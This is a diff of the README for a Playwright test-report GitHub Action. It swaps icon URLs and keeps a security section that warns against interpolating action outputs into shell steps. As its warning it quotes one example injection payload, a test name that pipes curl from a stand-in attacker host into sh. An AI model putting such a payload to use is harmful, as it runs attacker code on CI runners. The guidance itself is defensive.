@@ -1,4 +1,4 @@
-# ![report](https://icongr.am/octicons/comment-discussion.svg?size=22&color=abb4bf)   Playwright Report Summary
+# ![report](https://api.iconify.design/octicon/comment-discussion-16.svg?height=22&color=%23abb4bf)   Playwright Report Summary
 
 [![CI](https://github.com/daun/playwright-report-summary/actions/workflows/ci.yml/badge.svg)](https://github.com/daun/playwright-report-summary/actions/workflows/ci.yml)
 [![CodeQL](https://github.com/daun/playwright-report-summary/actions/workflows/codeql.yml/badge.svg)](https://github.com/daun/playwright-report-summary/actions/workflows/codeql.yml)
@@ -161,7 +161,7 @@ to post-process. When tests are added from external pull requests, **those strin
 GitHub Actions output values are **interpolated literally before shell parsing**, passing them into a `run:` step can
 lead to script injection on the runner.
 
-#### ![check](https://icongr.am/octicons/shield-check.svg?size=12&color=abb4bf) Safe patterns
+#### ![check](https://api.iconify.design/octicon/shield-check-16.svg?height=12&color=%23abb4bf) Safe patterns
 
 Pass outputs as inputs to another action. Action inputs are not shell-interpreted.
 
@@ -189,7 +189,7 @@ The value never touches the shell parser.
     SUMMARY: ${{ steps.summary.outputs.summary }}
 ```
 
-#### ![check](https://icongr.am/octicons/shield.svg?size=12&color=abb4bf) Unsafe patterns
+#### ![check](https://api.iconify.design/octicon/shield-16.svg?height=12&color=%23abb4bf) Unsafe patterns
 
 Do **not** interpolate outputs directly into a `run:` script. A test named `` `; curl evil.example | sh; # `` would
 execute on your runner.
